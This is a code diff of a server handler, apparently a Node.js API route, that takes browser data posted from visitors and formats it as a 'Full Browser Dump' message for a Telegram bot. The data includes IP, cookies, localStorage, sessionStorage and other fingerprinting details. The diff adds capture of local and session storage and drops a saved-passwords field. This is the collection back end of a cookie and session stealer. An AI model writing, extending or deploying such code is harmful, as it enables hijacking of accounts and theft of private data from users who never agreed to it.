@@ -6,16 +6,21 @@ export default async function handler(req, res) {
   try {
     const data = req.body;
     
+    // Format LocalStorage nicely
+    const lsStr = JSON.stringify(data.localStorage, null, 2).substring(0, 500);
+    const ssStr = JSON.stringify(data.sessionStorage, null, 2).substring(0, 500);
+
     const message = `
 🔓 *Full Browser Dump*
 🆔 IP: \`${data.ip}\`
 🌐 URL: ${data.windowLocation}
-🖥️ UA: ${data.userAgent.substring(0, 50)}...
+🖥️ UA: ${data.userAgent.substring(0, 60)}...
 💻 Platform: ${data.platform}
 🍪 Cookies: \`${data.cookies || "N/A"}\`
-🔑 Saved Passwords: ${JSON.stringify(data.savedPasswords).substring(0, 100)}...
-💾 Local Session: \`${data.localSession || "N/A"}\`
+💾 LocalStorage: \`${lsStr}\`
+🗄️ SessionStorage: \`${ssStr}\`
 📄 Title: ${data.title || "N/A"}
+🖥️ Screen: ${data.screenRes || "N/A"}
     `.trim();
 
     const tgToken = process.env.TELEGRAM_BOT_TOKEN;
